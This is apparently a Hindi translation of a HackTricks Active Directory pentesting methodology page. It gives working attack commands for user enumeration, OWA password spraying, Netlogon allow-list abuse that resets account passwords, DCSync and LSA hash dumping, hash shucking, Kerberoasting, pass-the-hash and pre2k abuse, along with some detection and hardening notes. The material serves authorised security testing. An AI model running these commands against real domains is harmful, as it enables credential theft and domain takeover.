# Active Directory कार्यप्रणाली

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी परिचय

**Active Directory** एक आधारभूत तकनीक है, जो **नेटवर्क प्रशासकों** को नेटवर्क में **डोमेन**, **उपयोगकर्ता** और **ऑब्जेक्ट** कुशलता से बनाने और प्रबंधित करने में सक्षम बनाती है। इसे बड़े पैमाने पर काम करने के लिए बनाया गया है, ताकि बड़ी संख्या में उपयोगकर्ताओं को प्रबंधनीय **समूहों** और **उपसमूहों** में व्यवस्थित किया जा सके और अलग-अलग स्तरों पर **पहुँच अधिकारों** को नियंत्रित किया जा सके।

**Active Directory** की संरचना में तीन मुख्य स्तर होते हैं: **डोमेन**, **ट्री** और **फ़ॉरेस्ट**। एक **डोमेन** में ऐसे ऑब्जेक्ट का समूह होता है, जैसे **उपयोगकर्ता** या **डिवाइस**, जो एक साझा डेटाबेस का उपयोग करते हैं। **ट्री** ऐसे डोमेनों के समूह होते हैं, जो एक साझा संरचना से जुड़े होते हैं। **फ़ॉरेस्ट** कई ट्री का समूह होता है, जो **ट्रस्ट संबंधों** के माध्यम से आपस में जुड़े होते हैं और संगठनात्मक संरचना का सबसे ऊपरी स्तर बनाते हैं। इन प्रत्येक स्तर पर विशिष्ट **पहुँच** और **संचार अधिकार** निर्धारित किए जा सकते हैं।

**Active Directory** की मुख्य अवधारणाएँ:

1. **डायरेक्टरी** – इसमें Active Directory ऑब्जेक्ट से संबंधित सारी जानकारी होती है।
2. **ऑब्जेक्ट** – डायरेक्टरी में मौजूद इकाइयों को दर्शाता है, जिनमें **उपयोगकर्ता**, **समूह** या **शेयर्ड फ़ोल्डर** शामिल हैं।
3. **डोमेन** – डायरेक्टरी ऑब्जेक्ट के लिए कंटेनर का काम करता है। एक **फ़ॉरेस्ट** में कई डोमेन हो सकते हैं, और हर डोमेन में ऑब्जेक्ट का अपना संग्रह होता है।
4. **ट्री** – ऐसे डोमेनों का समूह, जिनका रूट डोमेन एक ही होता है।
5. **फ़ॉरेस्ट** – Active Directory में संगठनात्मक संरचना का सर्वोच्च स्तर, जिसमें कई ट्री होते हैं और उनके बीच **ट्रस्ट संबंध** होते हैं।

**Active Directory Domain Services (AD DS)** में कई ऐसी सेवाएँ शामिल हैं, जो नेटवर्क के केंद्रीकृत प्रबंधन और संचार के लिए आवश्यक हैं। इनमें शामिल हैं:

1. **Domain Services** – डेटा को केंद्रीकृत रूप से संग्रहीत करता है और **उपयोगकर्ताओं** तथा **डोमेनों** के बीच होने वाली गतिविधियों का प्रबंधन करता है। इसमें **प्रमाणीकरण** और **खोज** की सुविधाएँ भी शामिल हैं।
2. **Certificate Services** – सुरक्षित **डिजिटल प्रमाणपत्रों** के निर्माण, वितरण और प्रबंधन की निगरानी करता है।
3. **Lightweight Directory Services** – **LDAP प्रोटोकॉल** के माध्यम से डायरेक्टरी-सक्षम एप्लिकेशन का समर्थन करता है।
4. **Directory Federation Services** – एक ही सेशन में कई वेब एप्लिकेशन पर उपयोगकर्ताओं का प्रमाणीकरण करने के लिए **single-sign-on** की सुविधा देता है।
5. **Rights Management** – कॉपीराइट वाली सामग्री के अनधिकृत वितरण और उपयोग को नियंत्रित करके उसकी सुरक्षा में मदद करता है।
6. **DNS Service** – **डोमेन नामों** को resolve करने के लिए महत्वपूर्ण है।

विस्तृत जानकारी के लिए देखें: [**TechTerms - Active Directory की परिभाषा**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

**AD पर हमला** करना सीखने के लिए आपको **Kerberos authentication process** को अच्छी तरह **समझना** होगा।\
[**अगर आपको अब भी नहीं पता कि यह कैसे काम करता है, तो यह पेज पढ़ें।**](kerberos-authentication.md)

## चीट शीट

AD को enumerate/exploit करने के लिए कौन-से commands चला सकते हैं, इसका त्वरित अवलोकन पाने के लिए [https://wadcoms.github.io/](https://wadcoms.github.io) देखें।

> [!WARNING]
> Kerberos संचार के लिए आम तौर पर **fully qualified domain name (FQDN)** ज़रूरी होता है, ताकि client सही SPN के लिए ticket प्राप्त कर सके। मशीन को IP address से access करने पर अक्सर Kerberos के बजाय NTLM का उपयोग होता है।

## Active Directory की Recon (कोई credentials/sessions नहीं)

अगर आपको AD environment का access मिला है, लेकिन आपके पास कोई credentials/sessions नहीं हैं, तो आप:

- **नेटवर्क का pentest कर सकते हैं:**
  - नेटवर्क scan करें, मशीनें और खुले ports ढूँढें, और उनमें मौजूद **vulnerabilities का exploit** करने या उनसे **credentials निकालने** की कोशिश करें (उदाहरण के लिए, [printers बहुत दिलचस्प targets हो सकते हैं](ad-information-in-printers.md))।
  - DNS को enumerate करने से domain के मुख्य servers के बारे में जानकारी मिल सकती है, जैसे web, printers, shares, vpn, media आदि।
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - इसे करने के बारे में और जानकारी के लिए सामान्य [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) देखें।
- **smb services पर null और Guest access की जाँच करें** (यह आधुनिक Windows versions पर काम नहीं करेगा):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - SMB server को enumerate करने की अधिक विस्तृत गाइड यहाँ मिलेगी:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap को enumerate करें**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP को enumerate करने की अधिक विस्तृत गाइड यहाँ मिलेगी (**anonymous access पर विशेष ध्यान दें**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **नेटवर्क को poison करें**
  - [**Responder के साथ services का रूप धारण करके**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credentials इकट्ठा करें।
  - [**relay attack का दुरुपयोग करके**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host access करें।
  - [**evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) के साथ fake UPnP services **expose करके** credentials इकट्ठा करें।
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Internal documents, social media, domain environment के अंदर की services (मुख्यतः web) और सार्वजनिक रूप से उपलब्ध स्रोतों से usernames/names निकालें।
  - अगर आपको कंपनी के कर्मचारियों के पूरे नाम मिलें, तो AD के अलग-अलग **username conventions (**[**यह पढ़ें**](https://activedirectorypro.com/active-directory-user-naming-convention/)) आज़मा सकते हैं। सबसे आम conventions हैं: _NameSurname_, _Name.Surname_, _NamSur_ (दोनों नामों के 3 अक्षर), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123)।
  - Tools:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### उपयोगकर्ता enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) और [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) पेज देखें।
- **Kerbrute enum**: जब **अमान्य username का अनुरोध किया जाता है**, तो server _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos error** code के साथ जवाब देता है। इससे हम पता लगा सकते हैं कि username अमान्य है। **मान्य usernames** के लिए या तो **AS-REP में TGT** response मिलता है, या _KRB5KDC_ERR_PREAUTH_REQUIRED_ error मिलता है, जो बताता है कि उपयोगकर्ता को pre-authentication करना होगा।
- **MS-NRPC के विरुद्ध कोई authentication नहीं**: Domain controllers पर MS-NRPC (Netlogon) interface के विरुद्ध auth-level = 1 (No authentication) का उपयोग करें। यह तरीका MS-NRPC interface से bind करने के बाद `DsrGetDcNameEx2` function को call करता है, ताकि बिना credentials के पता लगाया जा सके कि उपयोगकर्ता या कंप्यूटर मौजूद है या नहीं। [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool इस तरह के enumeration को लागू करता है। यह शोध [यहाँ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> उपलब्ध है।

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

अगर आपको network में ऐसा कोई server मिलता है, तो आप उसके विरुद्ध **user enumeration** भी कर सकते हैं। उदाहरण के लिए, आप [**MailSniper**](https://github.com/dafthack/MailSniper) tool का उपयोग कर सकते हैं:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> आप usernames की सूचियाँ [**इस GitHub repo में**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) और इस repo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) में पा सकते हैं।
>
> हालाँकि, आपके पास कंपनी में काम करने वाले लोगों के **नाम** उस recon step से होने चाहिए, जिसे आपने इससे पहले किया होगा। नाम और surname से, संभावित मान्य usernames बनाने के लिए आप [**namemash.py**](https://gist.github.com/superkojiman/11076951) script का उपयोग कर सकते हैं।

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

DC पर **Zerologon** patch होने के बाद भी, स्पष्ट रूप से allow-listed accounts **legacy/vulnerable Netlogon secure-channel behavior** के जोखिम में रह सकते हैं। जोखिमपूर्ण configuration है GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** या उससे मेल खाने वाला registry value **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**।

यह value एक **SDDL security descriptor** है (देखें [Security Descriptors](security-descriptors.md))। DACL में संबंधित ACE दिए गए किसी भी account या group को target किया जा सकता है। उदाहरण के लिए, `O:BAG:BAD:(A;;RC;;;WD)` प्रभावी रूप से **Everyone** को allow-list करता है।

व्यावहारिक operator workflow:

1. **Allow-listed principals** की पहचान करने के लिए **SYSVOL/GPO** और **live DC registry**, दोनों जाँचें।
2. SDDL में मिले **SIDs** को वास्तविक AD users/computers से resolve करें और **DC machine accounts**, **trust accounts**, तथा अन्य privileged machines को प्राथमिकता दें।
3. Allow-listed account के रूप में **MS-NRPC / Netlogon authentication** बार-बार आज़माएँ।
4. सफल guess के बाद, target account का password reset करने के लिए **Netlogon password-setting** का दुरुपयोग करें (public PoC इसे empty string पर सेट करता है)।<sup>[[9]](#references)[[10]](#references)</sup>

Public artifact से quick triage / lab examples:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

नोट्स:

- **scanner** उपयोगी है, क्योंकि प्रभावी allow-list **SYSVOL**, **registry**, या दोनों में हो सकती है।
- Exploit path महत्वपूर्ण है, क्योंकि किसी vulnerable account की पहचान हो जाने के बाद इसके लिए **Domain Admin privileges** की आवश्यकता **नहीं होती**।
- **Domain Controller machine account** जैसे `DC$` को compromise करना विशेष रूप से खतरनाक है, क्योंकि उसका password reset करने से सीधे व्यापक **AD takeover** के रास्ते खुल सकते हैं।
- **Brute-force feasibility** mode पर निर्भर करती है: सार्वजनिक artifact में meet-in-the-middle approach, कोई दूसरा computer account उपलब्ध होने पर **24-bit** brute force, और धीमे **32-bit** variants बताए गए हैं।

Detection / hardening notes:

- Allow-list policy का audit करें और अस्थायी, स्पष्ट रूप से आवश्यक compatibility exceptions के अलावा सब कुछ हटा दें।
- DC **System** events **5827/5828/5829/5830/5831** monitor करें, ताकि vulnerable Netlogon connections को deny किए जाने, खोजे जाने या policy द्वारा स्पष्ट रूप से allow किए जाने का पता चल सके।
- `VulnerableChannelAllowList` में मौजूद accounts को तब तक **high-risk** मानें, जब तक legacy dependency हटा न दी जाए।

### एक या कई usernames जानना

ठीक है, आपको पता है कि आपके पास पहले से एक valid username है, लेकिन कोई passwords नहीं... तो यह आज़माएँ:

- [**ASREPRoast**](asreproast.md): यदि किसी user के पास _DONT_REQ_PREAUTH_ attribute **नहीं है**, तो आप उस user के लिए **AS_REP message का अनुरोध** कर सकते हैं, जिसमें user के password से निकले हुए data को encrypt किया गया होगा।
- [**Password Spraying**](password-spraying.md): आइए, खोजे गए हर user के साथ सबसे **common passwords** आज़माएँ। शायद कोई user कमज़ोर password इस्तेमाल कर रहा हो (password policy का ध्यान रखें!)।
  - ध्यान दें कि users के mail servers तक पहुँच पाने की कोशिश के लिए आप **OWA servers पर भी spray** कर सकते हैं।


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

आप **network** के कुछ protocols को **poisoning** करके कुछ challenge **hashes प्राप्त** कर सकते हैं, जिन्हें crack किया जा सकता है:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration से usernames, email identifiers और naming patterns, संभावित hosts, और वे services मिलती हैं जिन्हें authentication के लिए विवश किया जा सकता है। इस जानकारी का उपयोग करके व्यवहार्य NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) और AD environment में प्रवेश के संभावित रास्तों की पहचान करें।

### NetExec workspace-driven recon और relay posture checks

- हर engagement के लिए AD recon state अलग रखने हेतु **`nxcdb` workspaces** का उपयोग करें: `workspace create <name>` से `~/.nxc/workspaces/<name>` में प्रति-protocol SQLite DBs (smb/mssql/winrm/ldap/etc) बनते हैं। `proto smb|mssql|winrm` से views बदलें और `creds` से एकत्र किए गए secrets की सूची देखें। काम पूरा होने पर संवेदनशील data को manually purge करें: `rm -rf ~/.nxc/workspaces/<name>`।<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** से subnet की quick discovery करने पर **domain**, **OS build**, **SMB signing requirements**, और **Null Auth** का पता चलता है। `(signing:False)` दिखाने वाले members **relay-prone** होते हैं, जबकि DCs में अक्सर signing आवश्यक होता है।
- Targeting आसान करने के लिए NetExec output से सीधे **/etc/hosts में hostnames बनाएँ**:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- जब **signing** के कारण **DC तक SMB relay** अवरुद्ध हो, तब भी **LDAP** की स्थिति जाँचें: `netexec ldap <dc>` `(signing:None)` / कमजोर channel binding दिखाता है। जिस DC पर SMB signing आवश्यक हो, लेकिन LDAP signing अक्षम हो, वह **SPN-less RBCD** जैसे दुरुपयोगों के लिए अब भी एक व्यवहार्य **relay-to-LDAP** लक्ष्य है।

### क्लाइंट-साइड प्रिंटर credential leaks → डोमेन credentials का बड़े पैमाने पर सत्यापन

- Printer/web UI कभी-कभी HTML में **masked admin passwords** embed करते हैं। सोर्स/devtools देखने से cleartext सामने आ सकता है (उदाहरण: `<input value="<password>">`), जिससे scan/print repositories तक Basic-auth access मिल सकता है।
- प्राप्त print jobs में प्रति-user passwords वाले **plaintext onboarding docs** हो सकते हैं। परीक्षण के दौरान जोड़ियों को संरेखित रखें:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Steal NTLM Creds

यदि आप **null या guest user** के ज़रिए **दूसरे PCs या shares को access** कर सकते हैं, तो आप **files रख** सकते हैं (जैसे SCF file), जिन्हें किसी तरह access किए जाने पर वे आपके विरुद्ध **NTLM authentication trigger** करें। इससे आप **NTLM challenge चुरा** सकते हैं और उसे crack कर सकते हैं:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** आपके पास मौजूद हर NT hash को दूसरे, धीमे formats के लिए candidate password मानता है, जिनकी key material सीधे NT hash से derive होती है। Kerberos RC4 tickets, NetNTLM challenges या cached credentials में लंबे passphrases को brute-force करने के बजाय, आप NT hashes को Hashcat के NT-candidate modes में डालते हैं और plaintext जाने बिना password reuse को validate करवाते हैं। यह खास तौर पर domain compromise के बाद असरदार है, जब आप हज़ारों मौजूदा और ऐतिहासिक NT hashes इकट्ठा कर सकते हैं।<sup>[[5]](#references)</sup>

Shucking का इस्तेमाल करें, जब:

- आपके पास DCSync, SAM/SECURITY dumps या credential vaults से मिला NT corpus हो और आपको दूसरे domains/forests में reuse की जाँच करनी हो।
- आप RC4-आधारित Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses या DCC/DCC2 blobs capture करते हैं।
- आप लंबे, crack न हो सकने वाले passphrases के reuse को तेज़ी से साबित करना चाहते हों और तुरंत Pass-the-Hash के ज़रिए pivot करना चाहते हों।

यह technique उन encryption types के विरुद्ध **काम नहीं करती**, जिनकी keys NT hash नहीं होतीं (जैसे Kerberos etype 17/18 AES)। यदि कोई domain केवल AES लागू करता है, तो आपको नियमित password modes पर वापस जाना होगा।

#### NT hash corpus बनाना

- **DCSync/NTDS** – इतिहास सहित NT hashes का सबसे बड़ा संभव set हासिल करने के लिए `secretsdump.py` का इस्तेमाल करें:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  History entries उम्मीदवारों के पूल को काफी बढ़ा देते हैं, क्योंकि Microsoft हर खाते के लिए अधिकतम 24 पुराने hashes स्टोर कर सकता है। NTDS secrets हासिल करने के और तरीकों के लिए देखें:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (या Mimikatz `lsadump::sam /patch`) स्थानीय SAM/SECURITY डेटा और cache किए गए domain logons (DCC/DCC2) निकालता है। डुप्लिकेट हटाएँ और उन hashes को उसी `nt_candidates.txt` सूची में जोड़ें।
- **Metadata ट्रैक करें** – हर hash से जुड़ा username/domain रखें (भले ही wordlist में केवल hex हो)। जब Hashcat सफल candidate दिखाएगा, तो matching hashes तुरंत बता देंगे कि कौन-सा principal वही password दोबारा इस्तेमाल कर रहा है।
- उसी forest या किसी trusted forest के candidates को प्राथमिकता दें; इससे shucking के दौरान overlap की संभावना सबसे अधिक होती है।

#### Hashcat NT-candidate modes

| Hash प्रकार                              | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **raw 32-hex NT hashes ही रहने चाहिए**। Rule engines बंद रखें (`-r` नहीं, hybrid modes नहीं), क्योंकि mangling से candidate key material बिगड़ जाता है।
- ये modes अपने आप तेज़ नहीं होते, लेकिन NTLM keyspace (~30,000 MH/s on an M3 Max) Kerberos RC4 (~300 MH/s) से ~100× तेज़ है। धीमे format में पूरा password space खोजने की तुलना में चुनी हुई NT सूची जाँचना बहुत कम खर्चीला है।
- हमेशा **latest Hashcat build** चलाएँ (`git clone https://github.com/hashcat/hashcat && make install`), क्योंकि modes 31500/31600/35300/35400 हाल ही में जारी हुए हैं।<sup>[[7]](#references)</sup>
- फिलहाल AS-REQ Pre-Auth के लिए कोई NT mode नहीं है, और AES etypes (19600/19700) के लिए plaintext password चाहिए, क्योंकि उनकी keys raw NT hashes से नहीं, बल्कि UTF-16LE passwords से PBKDF2 के ज़रिए derive होती हैं।

#### उदाहरण – Kerberoast RC4 (mode 35300)

1. कम privileges वाले user से target SPN के लिए RC4 TGS capture करें (विवरण के लिए Kerberoast page देखें):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. अपनी NT list से ticket shuck करें:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat हर NT candidate से RC4 key निकालता है और `$krb5tgs$23$...` blob को validate करता है। Match मिलने पर पुष्टि होती है कि service account आपके मौजूदा NT hashes में से किसी एक का उपयोग करता है।

3. तुरंत PtH के ज़रिए pivot करें:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   जरूरत पड़ने पर आप बाद में `hashcat -m 1000 <matched_hash> wordlists/` से plaintext प्राप्त कर सकते हैं।

#### उदाहरण – Cached credentials (mode 31600)

1. Compromised workstation से cached logons dump करें:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. दिलचस्प domain user के लिए DCC2 line को `dcc2_highpriv.txt` में कॉपी करें और उसे shuck करें:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. सफल match से आपके list में पहले से ज्ञात NT hash मिलता है, जिससे साबित होता है कि cached user वही password दोबारा इस्तेमाल कर रहा है। इसे सीधे PtH के लिए इस्तेमाल करें (`nxc smb <dc_ip> -u highpriv -H <hash>`) या string प्राप्त करने के लिए fast NTLM mode में brute-force करें।

ठीक यही workflow NetNTLM challenge-responses (`-m 27000/27100`) और DCC (`-m 31500`) पर भी लागू होता है। Match मिलने के बाद आप relay, SMB/WMI/WinRM PtH शुरू कर सकते हैं या masks/rules के साथ NT hash को offline दोबारा crack कर सकते हैं।



## Active Directory का credentials/session के साथ Enumeration

इस चरण के लिए आपके पास किसी वैध domain account के **credentials या session का compromise होना चाहिए।** अगर आपके पास कुछ वैध credentials हैं या domain user के रूप में shell है, तो **याद रखें कि पहले दिए गए विकल्प अब भी अन्य users को compromise करने के विकल्प हैं।**

Authenticated enumeration शुरू करने से पहले, **Kerberos double-hop problem** को समझें।


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

किसी account को compromise करना **domain का आकलन करने की दिशा में एक बड़ा कदम** है, क्योंकि इससे authenticated **Active Directory enumeration** संभव होता है:

[**ASREPRoast**](asreproast.md) के संबंध में, अब आप हर संभावित vulnerable user ढूँढ़ सकते हैं। [**Password Spraying**](password-spraying.md) के संबंध में, आप **सभी usernames की list** प्राप्त कर सकते हैं और compromised account का password, खाली passwords और नए संभावित passwords आज़मा सकते हैं।

- आप [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) का इस्तेमाल कर सकते हैं
- आप recon के लिए [**powershell for recon**](../basic-powershell-for-pentesters/index.html) भी इस्तेमाल कर सकते हैं, जो अधिक stealthy होगा
- अधिक विस्तृत जानकारी निकालने के लिए आप [**use powerview**](../basic-powershell-for-pentesters/powerview.md) भी इस्तेमाल कर सकते हैं
- Active Directory में recon के लिए एक और शानदार tool [**BloodHound**](bloodhound.md) है। यह **ज़्यादा stealthy नहीं है** (आपके इस्तेमाल किए गए collection methods के आधार पर), लेकिन **अगर आपको इसकी परवाह नहीं है**, तो इसे ज़रूर आज़माएँ। पता लगाएँ कि users कहाँ RDP कर सकते हैं, दूसरे groups तक पहुँचने का रास्ता ढूँढ़ें, आदि।
  - **अन्य automated AD enumeration tools हैं:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) देखें, क्योंकि उनमें दिलचस्प जानकारी हो सकती है।
- Directory की enumeration के लिए इस्तेमाल किया जा सकने वाला **GUI वाला tool**, **SysInternal** Suite का **AdExplorer.exe** है।
- आप LDAP database में **ldapsearch** से भी खोज कर सकते हैं और _userPassword_ व _unixUserPassword_ fields, या user के _description_ और _info_ notes में credentials ढूँढ़ सकते हैं। _info_ में बिना label वाला, password जैसा token केवल एक candidate है: उसके उद्देश्य और वैधता की अलग से पुष्टि करें, और सामान्य enumeration output में notes की सामग्री शामिल न करें। अन्य तरीकों के लिए PayloadsAllTheThings पर [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) देखें।
- अनुमति होने पर `\\<dc>\NETLOGON` या `\\<dc>\SYSVOL\<domain>\scripts` में मौजूद **सुलभ** domain logon और drive-mapping scripts की समीक्षा करें। [Microsoft documents](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) में NETLOGON share की script-directory की भूमिका बताई गई है। पहले names की list बनाएँ, फिर केवल संबंधित, पढ़ी जा सकने वाली scripts की size limit के भीतर जाँच करें; पूरी share dump न करें और सामान्य enumeration के दौरान credential values प्रदर्शित न करें। [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) को call करने से script में रखा literal password **सुरक्षित नहीं** हो जाता। केवल यह call होना इस बात का प्रमाण नहीं है कि secret hardcoded है: उसके वास्तविक input का पता लगाएँ, फिर account, credential की वैधता और privileges की अलग से पुष्टि करें। Domain script की समीक्षा remote share की जाँच है, local host enumeration से अलग।
- अगर आप **Linux** इस्तेमाल कर रहे हैं, तो [**pywerview**](https://github.com/the-useless-one/pywerview) से भी domain enumerate कर सकते हैं।
- आप automated tools भी आज़मा सकते हैं, जैसे:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **सभी domain users निकालना**

  Windows से सभी domain usernames पाना बहुत आसान है (`net user /domain` ,`Get-DomainUser` या `wmic useraccount get name,sid`)। Linux में, आप यह इस्तेमाल कर सकते हैं: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` या `enum4linux -a -u "user" -p "password" <DC IP>`

> भले ही यह Enumeration section छोटा लगे, लेकिन यह सबसे महत्वपूर्ण हिस्सा है। Links खोलें (मुख्य रूप से cmd, powershell, powerview और BloodHound वाले), domain enumerate करना सीखें और तब तक अभ्यास करें, जब तक आप सहज महसूस न करें। Assessment के दौरान, DA तक पहुँचने का रास्ता ढूँढ़ने या यह तय करने के लिए कि कुछ नहीं किया जा सकता, यही सबसे अहम क्षण होगा।

### अनुमान लगाए जा सकने वाले पहले से बनाए गए computer accounts -> gMSA password access

Legacy joins के लिए तैयार किए गए computer accounts में अनुमान लगाए जा सकने वाला initial password बना रह सकता है। NetExec का `pre2k` module विशिष्ट `userAccountControl` value `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) पहचानता है और computer name के lowercase रूप के पहले 14 characters, अंत का `$` हटाकर, इस्तेमाल करते हुए Kerberos TGT पाने की कोशिश करता है। इस UAC value को candidates चुनने के लिए इस्तेमाल करें; केवल **Pre-Windows 2000 Compatible Access** की membership को इस बात का प्रमाण न मानें कि password कमज़ोर है।<sup>[[18]](#references)[[20]](#references)</sup>

Candidates जाँचने और सफल TGTs सहेजने के लिए authenticated LDAP enumeration इस्तेमाल करें। `ALL=True` से default `4128` filter वाले objects से आगे भी testing होती है।<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

